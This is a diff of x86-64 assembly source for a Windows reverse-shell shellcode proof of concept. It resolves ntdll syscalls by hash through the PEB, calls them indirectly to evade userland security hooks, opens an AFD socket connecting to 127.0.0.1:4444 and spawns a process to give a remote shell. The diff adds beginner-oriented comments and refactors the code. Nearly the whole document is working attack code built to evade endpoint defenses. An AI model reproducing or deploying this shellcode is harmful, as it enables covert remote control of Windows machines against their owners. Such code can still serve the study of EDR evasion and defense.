@@ -1,14 +1,19 @@
 BITS 64
 
+; Reverse Shell with Indirect Syscalls.
+;
 ; This proof-of-concept is designed to execute
-; standalone with userland hook evasion.
+; standalone with userland hook evasion. Also,
+; I designed this shellcode to be as verbose
+; as possible. People with no prior assembly
+; experience should be able to follow.
 ;
 ;                .,u%:;-..
 ;             ,d$$$$7^^?$i;.
 ;           ,' /^$S'    `?$i:.
 ;          j ,'  I$,     jb.:i:
 ;        ,$S$$b,j$S$$bupd$'.:i;.
-;        ,//:"?a$$SI$?S$$b,:iIi:.
+;        ,;//"?a$$SI$?S$$b,:iIi:.
 ;          '   '/?$*'   -*?L':i::
 ;                ^,'.  j?'b,\ .::
 ;        .,           .7i_,   .:.
@@ -17,74 +22,53 @@ BITS 64
 ;       $d$$$SSIiS$$7j7?i:
 ;          '^"="^'^'^"
 
-        CLD
-        AND     RSP,    0xFFFFFFFFFFFFFFF0
-        MOV     RAX,    0x7369746E656C6973
-        PUSH    RAX
+        CALL    INIT_SHELLCODE
 
-GET_NTDLL:
-        MOV     RAX,    GS:[0x60]
-        MOV     RAX,    [RAX + 0x18]
-        MOV     RAX,    [RAX + 0x30]
-        MOV     RAX,    [RAX + 0x10]
-        PUSH    RAX
-        
-        SUB     RSP,    0x60
+        SUB     RSP,    0x70
         MOV     RBP,    RSP
 
-; GET_NTTERMINATEPROCESS:
-;         MOV     RCX,    QWORD   [RBP + 0x60]
-;         MOV     RDX,    0x618D8E8F
-;         CALL    FIND_SYSCALL
-;         
-;         MOV     DWORD   [RSP + 0x48],   EAX
-;         MOV     QWORD   [RSP + 0x40],   RCX
+        CALL    INIT_NTDLL_API
 
-GET_NTTERMINATETHREAD:
-        MOV     RCX,    QWORD   [RBP + 0x60]
-        MOV     RDX,    0x3ECF2582
-        CALL    FIND_SYSCALL
-
-        MOV     DWORD   [RBP + 0x48],   EAX
-        MOV     QWORD   [RBP + 0x40],   RCX
-
-GET_NTCREATEFILE:
-        MOV     RCX,    QWORD   [RBP + 0x60]
-        MOV     RDX,    0x4489294C
-        CALL    FIND_SYSCALL
-
-        MOV     DWORD   [RBP + 0x38],   EAX
-        MOV     QWORD   [RBP + 0x30],   RCX
-
-GET_NTCREATEUSERPROCESS:
-        MOV     RCX,    QWORD   [RBP + 0x60]
-        MOV     RDX,    0xC43BACB
-        CALL    FIND_SYSCALL
-
-        MOV     DWORD   [RBP + 0x28],   EAX
-        MOV     QWORD   [RBP + 0x20],   RCX
-
-GET_NTDEVICEIOCONTROLFILE:
-        MOV     RCX,    QWORD   [RBP + 0x60]
-        MOV     RDX,    0x7FB40DDF
-        CALL    FIND_SYSCALL
-
-        MOV     DWORD   [RBP + 0x18],   EAX
-        MOV     QWORD   [RBP + 0x10],   RCX
-
-GET_RTLCREATEUSERPROCESSPARAMS:
-        MOV     RCX,    QWORD   [RBP + 0x60]
-        MOV     RDX,    0x90E3A882
-        CALL    FIND_SYSCALL
-
-        MOV     DWORD   [RBP + 0x08],   EAX
-        MOV     QWORD   [RBP + 0x00],   RCX
+; Windows ABI follows a standard calling convention.
+;
+; RCX                           => 1st parameter
+; RDX                           => 2nd parameter
+; R8                            => 3rd parameter
+; R9                            => 4th parameter
+; [RSP + 0x20]                  => 5th parameter
+; [RSP + 0x28]                  => 6th parameter
+; ...
+; [RSP + 0x00 .. 0x018] Belong to the functions
+; being called. This stack space is used to save
+; any arguments that as may need be.
 
 SYSCALLS:
 
+        MOV     ECX,    DWORD   [RBP + 0x38]
+        MOV     RDX,    QWORD   [RBP + 0x30]
+        CALL    SET_SYSCALL
+
+; Creating a socket requires requesting a file
+; handle from the networking driver. NtCreateFile
+; requires 11 parameters.
+;
+; RCX                           => Pointer to handle.
+; RDX                           => Desired access.
+; R8                            => Object attributes.
+; R9                            => IO Status.
+; [RSP + 0x20]                  => Allocation size.
+; [RSP + 0x28]                  => File attributes.
+; [RSP + 0x30]                  => Share access.
+; [RSP + 0x38]                  => Create disposition.
+; [RSP + 0x40]                  => Create options.
+; [RSP + 0x48]                  => EA buffer.
+; [RSP + 0x50]                  => EA length.
+;
+; The only 2 that I know may be zero are
+; allocation size and file attributes.
+
 RUN_NTCREATEFILE:
-        CALL    CLEAN
-        PUSH    0x00
+        PUSH    0
         MOV     RCX,    RSP
         MOV     RDX,    0xC0100000
         MOV     RAX,    0x0074006e0069006f
@@ -100,25 +84,25 @@ RUN_NTCREATEFILE:
         PUSH    RSP
         PUSH    0x002A0028
         MOV     RAX,    RSP
-        PUSH    0x00
-        PUSH    0x00
+        PUSH    0
+        PUSH    0
         PUSH    0x42
         PUSH    RAX
-        PUSH    0x00
+        PUSH    0
         PUSH    0x30
         MOV     R8,     RSP
-        PUSH    0x00
-        PUSH    0x00
+        PUSH    0
+        PUSH    0
         MOV     R9,     RSP
         MOV     RAX,    0x00000000FFFFFFFF
         PUSH    RAX
         MOV     RAX,    0xFFFFFFFFFFFFFFFF
         PUSH    RAX
         PUSH    RSP
-        PUSH    0x06
+        PUSH    6
         MOV     RAX,    0x0000000100000002
         PUSH    RAX
-        PUSH    0x00
+        PUSH    0
         MOV     RAX,    0x00585874656B6361
         PUSH    RAX
         MOV     RAX,    0x506E65704F646641
@@ -129,33 +113,54 @@ RUN_NTCREATEFILE:
         LEA     RAX,    [RSP + 0x08]
         PUSH    RAX
         PUSH    0x20
-        PUSH    0x03
-        PUSH    0x03
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        MOV     R10,    [RBP + 0x38]
-        MOV     R11,    [RBP + 0x30]
-        CALL    SET_SYSCALL
+        PUSH    3
+        PUSH    3
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
         CALL    RUN_SYSCALL
+
         ADD     RSP,    0x118
-        CMP     RAX,    0x00
+        CMP     RAX,    0
         JNZ     RUN_NTTERMINATEPROCESS
 
+        MOV     ECX,    [RBP + 0x18]
+        MOV     RDX,    [RBP + 0x10]
+        CALL    SET_SYSCALL
+
+; NtDeviceIoControlFile requires 10 parameters.
+; A bind must come before a connection.
+;
+; RCX                           => Pointer to handle.
+; RDX                           => Event handle.
+; R8                            => Pointer to APC routine.
+; R9                            => Pointer to APC context.
+; [RSP + 0x20]                  => IO Status.
+; [RSP + 0x28]                  => Control Code (Bind).
+; [RSP + 0x30]                  => Pointer to input buffer.
+; [RSP + 0x38]                  => Input length.
+; [RSP + 0x40]                  => Pointer to output buffer.
+; [RSP + 0x48]                  => Output length.
+;
+; Event handle, APC routine, APC context may all be
+; zero.
+
 RUN_NTBIND:
-        CALL    CLEAN
-        MOV     RCX,    [RSP]
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
+        MOV     RCX,    QWORD   [RSP]
+        XOR     RDX,    RDX
+        XOR     R8,     R8
+        XOR     R9,     R9
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
         MOV     RAX,    0x200000002
         PUSH    RAX
-        PUSH    0x00
-        PUSH    0x00
+        PUSH    0
+        PUSH    0
         PUSH    0x10
         LEA     RAX,    QWORD   [RSP + 0x30]
         PUSH    RAX
@@ -165,31 +170,51 @@ RUN_NTBIND:
         PUSH    0x12003
         LEA     RAX,    QWORD   [RSP + 0x28]
         PUSH    RAX
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        MOV     R10,    [RBP + 0x18]
-        MOV     R11,    [RBP + 0x10]
-        CALL    SET_SYSCALL
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
         CALL    RUN_SYSCALL
+
         ADD     RSP,    0x88
-        CMP     RAX,    0x00
+        CMP     RAX,    0
         JNZ     RUN_NTTERMINATEPROCESS
 
+        MOV     ECX,    DWORD   [RBP + 0x18]
+        MOV     RDX,    QWORD   [RBP + 0x10]
+        CALL    SET_SYSCALL
+
+; Connecting.
+;
+; RCX                           => Pointer to handle.
+; RDX                           => Event handle.
+; R8                            => Pointer to APC routine.
+; R9                            => Pointer to APC context.
+; [RSP + 0x20]                  => IO Status.
+; [RSP + 0x28]                  => Control Code (Connect).
+; [RSP + 0x30]                  => Pointer to input buffer.
+; [RSP + 0x38]                  => Input length.
+; [RSP + 0x40]                  => Pointer to output buffer.
+; [RSP + 0x48]                  => Output length.
+;
+; Event handle, APC routine, APC context, output
+; buffer/length may all be zero.
+
 RUN_NTCONNECT:
-        CALL    CLEAN
-        MOV     RCX,    [RSP]
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
+        MOV     RCX,    QWORD   [RSP]
+        XOR     RDX,    RDX
+        XOR     R8,     R8
+        XOR     R9,     R9
+        PUSH    0
+        PUSH    0
+        PUSH    0
         MOV     RAX,    0x0100007F5C110002
         PUSH    RAX
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
         PUSH    0x10
         LEA     RAX,    QWORD   [RSP + 0x40]
         PUSH    RAX
@@ -199,21 +224,42 @@ RUN_NTCONNECT:
         PUSH    0x12007
         LEA     RAX,    QWORD   [RSP + 0x28]
         PUSH    RAX
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        MOV     R10,    [RBP + 0x18]
-        MOV     R11,    [RBP + 0x10]
-        CALL    SET_SYSCALL
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
         CALL    RUN_SYSCALL
+
         ADD     RSP,    0x98
-        CMP     RAX,    0x00
+        CMP     RAX,    0
         JNZ     RUN_NTTERMINATEPROCESS
 
+        MOV     ECX,    DWORD   [RBP + 0x08]
+        MOV     RDX,    QWORD   [RBP + 0]
+        CALL    SET_SYSCALL
+
+; NtCreateUserProcess requires 11 parameters. This
+; is the most bare-bones that I have gotten to work.
+;
+; RCX                           => Pointer to process handle.
+; RDX                           => Pointer to thread handle.
+; R8                            => Process access.
+; R9                            => Thread access.
+; [RSP + 0x20]                  => Process attributes.
+; [RSP + 0x28]                  => Thread attriutes.
+; [RSP + 0x30]                  => Process flags.
+; [RSP + 0x38]                  => Thread flags.
+; [RSP + 0x40]                  => Process parameters..
+; [RSP + 0x48]                  => Creation info.
+; [RSP + 0x50]                  => Attribute list.
+;
+; Event handle, APC routine, APC context, output
+; buffer/length may all be zero.
+
 RUN_RTLCREATEUSERPROCESSPARAMS:
-        CALL    CLEAN
-        PUSH    0x00
+        PUSH    0
+        PUSH    0
+        PUSH    0
         MOV     RCX,    RSP        
         MOV     RAX,    0x0000006500780065
         PUSH    RAX
@@ -234,93 +280,175 @@ RUN_RTLCREATEUSERPROCESSPARAMS:
         PUSH    RSP
         PUSH    0x0040003E
         MOV     RDX,    RSP
-        PUSH    0x00
+        PUSH    0
         PUSH    0x01
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        MOV     R10,    [RBP + 0x08]
-        MOV     R11,    [RBP + 0x00]
-        CALL    SET_SYSCALL
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
         CALL    RUN_SYSCALL
-        ADD     RSP,    0xB0
+
+        ADD     RSP,    0xC0
+
+        MOV     ECX,    DWORD   [RBP + 0x28]
+        MOV     RDX,    QWORD   [RBP + 0x20]
+        CALL    SET_SYSCALL
 
 RUN_NTCREATEUSERPROCESS:
-        MOV     R11,    [RSP]
-        ADD     R11,    0x10
-        MOV     RAX,    0xFFFFFFFFFFFFFFFD
-        MOV     QWORD   [R11],  RAX
-        ADD     R11,    0x10
-        MOV     RAX,    QWORD   [RSP + 0x08]
-        MOV     QWORD   [R11],  RAX
-        ADD     R11,    0x08
-        MOV     QWORD   [R11],  RAX
-        ADD     R11,    0x08
-        MOV     QWORD   [R11],  RAX
-        ADD     R11,    0x74
-        MOV     RAX,    0x00000100
-        MOV     DWORD   [R11],  EAX
-        SUB     R11,    0xA4
+        SUB     RSP,    0x10
+        MOV     RAX,    QWORD   [RSP]
+        MOV     RCX,    0xFFFFFFFFFFFFFFFD
+        MOV     QWORD   [RAX + 0x10],   RCX
+        MOV     RCX,    QWORD   [RSP + 0x18]
+        MOV     QWORD   [RAX + 0x20],   RCX
+        MOV     QWORD   [RAX + 0x28],   RCX
+        MOV     QWORD   [RAX + 0x30],   RCX
+        MOV     ECX,    0x00000100
+        MOV     QWORD   [RAX + 0xA4],   RCX
         SUB     RSP,    0x48
         MOV     RAX,    [RSP]
-        PUSH    0x00
+        PUSH    0
         MOV     RCX,    RSP
-        PUSH    0x00
+        PUSH    0
         MOV     RDX,    RSP
-        PUSH    0x00
+        PUSH    0
         PUSH    RAX
         PUSH    0x3E
         PUSH    0x20005
         PUSH    0x28
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
         PUSH    0x58
         LEA     RAX,    QWORD   [RSP + 0x50]
         PUSH    RAX
         LEA     RAX,    QWORD   [RSP + 0x08]
         PUSH    RAX
-        PUSH    R11
-        PUSH    0x00
-        PUSH    0x04
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
+        MOV     RAX,    QWORD   [RSP + 0xE0]
+        PUSH    RAX
+        PUSH    0
+        PUSH    4
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
         MOV     R8,     0x1F0FFF
         MOV     R9,     0x1F03FF
-        MOV     R10,    [RBP + 0x28]
-        MOV     R11,    [RBP + 0x20]
-        CALL    SET_SYSCALL
         CALL    RUN_SYSCALL
-        ADD     RSP,    0x0130
+
+        ADD     RSP,    0x130
+
+        MOV     ECX,    DWORD   [RBP + 0x48]
+        MOV     RDX,    QWORD   [RBP + 0x40]
+        CALL    SET_SYSCALL
 
 RUN_NTTERMINATEPROCESS:
-        MOV     RCX,    0x00
+        MOV     RCX,    0xFFFFFFFFFFFFFFFF
         XOR     RDX,    RDX
-        MOV     R10,    [RBP + 0x48]
-        MOV     R11,    [RBP + 0x40]
-        CALL    SET_SYSCALL
         CALL    RUN_SYSCALL
+
+; 7:     ...::^^:!.!!GY57~^:.        -!!7!!!--      .:^^--!!!!!--^^:..
+; 5J?J^^^^^:..^!YY277GYP! .!?-       . .-7-,-:^^-----^:::::::::^^--!!!!!!---^::..
+; &&5P?....:?55&’      YJ..YY5?     .J7:.Y?J?^  .       `^^^:^---^~~~~~~~~~!7777??!!!!!!---^::..
+; B&BBG!^::^&-          ?5?&BY7! .:^::^?75&Y7YJ                           .....::::^^-----!777?!!!--^::..
+; B&##Y.   :&!          :..~PYY7?B7:~~~^:Y7^.-^                                              ....:::::^^------!7?!!--^:....
+; PGGG5-.^-7BR          `!. :Y?^7G?:!:7?5`                                                                 ....::::!777!-----^::::......
+; JJJ7Y5~~7~75            ^^ .~  ^G?^^7!       5   .                                                                             .......:::::::...... hi
+; 7J???^``   :                     5?J!Y       ~~^.   ^7J..
+; :Y7!                               :/#         :^^    .~??~.
+; :Y?          .      .               PP                   .!?7^.
+; ^?           ^P   .YP~              !&^                ^~.    ‘
+; ?!              !!7: ^57:.       .:  ?#^
+; J-           5.?5^!  ^ ``!!.::.Y?!:   7B!
+; ?            #G&!?        `^^^^^^-^.   ^G?
+; ^.          .#B7`              ....?!.   JY:
+; ~          .5!:’                   ~^7.   !P!
+; ^.         G7 P                      7??:  :Y?
+; .:         5:Y                        ^7.::  7J:
+
+INIT_SHELLCODE:
+        CLD
+        MOV     RAX,    0x7369746E656C6973
+        MOV     RAX,    QWORD   [RSP]
+        AND     SPL,    0xF0
+        PUSH    RAX
+        RET
+
+GET_NTDLL:
+        MOV     RAX,    GS:[0x60]
+        MOV     RAX,    [RAX + 0x18]
+        MOV     RAX,    [RAX + 0x30]
+        MOV     RAX,    [RAX + 0x10]
+        RET
+
+INIT_NTDLL_API:
+        CALL    GET_NTDLL
+        MOV     QWORD   [RBP + 0x70],   RAX
+
+GET_NTTERMINATEPROCESS:
+        MOV     RCX,    QWORD   [RBP + 0x70]
+        MOV     RDX,    0x618D8E8F
+        LEA     R8,     QWORD   [RBP + 0x48]
+        LEA     R9,     QWORD   [RBP + 0x40]
+        CALL    FIND_SYSCALL
+
+; GET_NTTERMINATETHREAD:
+;         MOV     RCX,    QWORD   [RBP + 0x60]
+;         MOV     RDX,    0x3ECF2582
+;         CALL    FIND_SYSCALL
+;
+;         MOV     DWORD   [RBP + 0x48],   EAX
+;         MOV     QWORD   [RBP + 0x40],   RCX
+
+GET_NTCREATEFILE:
+        MOV     RCX,    QWORD   [RBP + 0x70]
+        MOV     RDX,    0x4489294C
+        LEA     R8,     QWORD   [RBP + 0x38]
+        LEA     R9,     QWORD   [RBP + 0x30]
+        CALL    FIND_SYSCALL
+
+GET_NTCREATEUSERPROCESS:
+        MOV     RCX,    QWORD   [RBP + 0x70]
+        MOV     RDX,    0xC43BACB
+        LEA     R8,     QWORD   [RBP + 0x28]
+        LEA     R9,     QWORD   [RBP + 0x20]
+        CALL    FIND_SYSCALL
+
+GET_NTDEVICEIOCONTROLFILE:
+        MOV     RCX,    QWORD   [RBP + 0x70]
+        MOV     RDX,    0x7FB40DDF
+        LEA     R8,     QWORD   [RBP + 0x18]
+        LEA     R9,     QWORD   [RBP + 0x10]
+        CALL    FIND_SYSCALL
+
+GET_RTLCREATEUSERPROCESSPARAMS:
+        MOV     RCX,    QWORD   [RBP + 0x70]
+        MOV     RDX,    0x90E3A882
+        LEA     R8,     QWORD   [RBP + 0x08]
+        LEA     R9,     QWORD   [RBP + 0x00]
+        CALL    FIND_SYSCALL
+
+        RET
 
 FIND_SYSCALL:
 
 PARSE_MODULE:
+        PUSH    R8
+        PUSH    R9
         MOV     R8D,    DWORD   [RCX + 0x3C]
         LEA     R8,     QWORD   [RCX + R8]
         MOV     R8D,    DWORD   [R8 + 0x88]
@@ -399,25 +527,21 @@ SAVE_INSTRUCT:
         LEA     RCX,    QWORD   [RDX + R8]
 
 ABANDON:
+        POP     R9
+        POP     R8
+        MOV     DWORD   [R8],   EAX
+        MOV     QWORD   [R9],   RCX
         RET
 
 SET_SYSCALL:
         XOR     RAX,    RAX
         MOV     DWORD   [RBP + 0x58],   EAX
         MOV     QWORD   [RBP + 0x50],   RAX
-        MOV     DWORD   [RBP + 0x58],   R10D
-        MOV     QWORD   [RBP + 0x50],   R11
+        MOV     DWORD   [RBP + 0x58],   ECX
+        MOV     QWORD   [RBP + 0x50],   RDX
         RET
 
 RUN_SYSCALL:
         MOV     EAX,    DWORD   [RBP + 0x58]
         MOV     R10,    RCX
         JMP     QWORD   [RBP + 0x50]
-
-CLEAN:
-        XOR     RCX,    RCX
-        XOR     RDX,    RDX
-        XOR     R8,     R8
-        XOR     R9,     R9
-        XOR     R10,    R10
-        RET
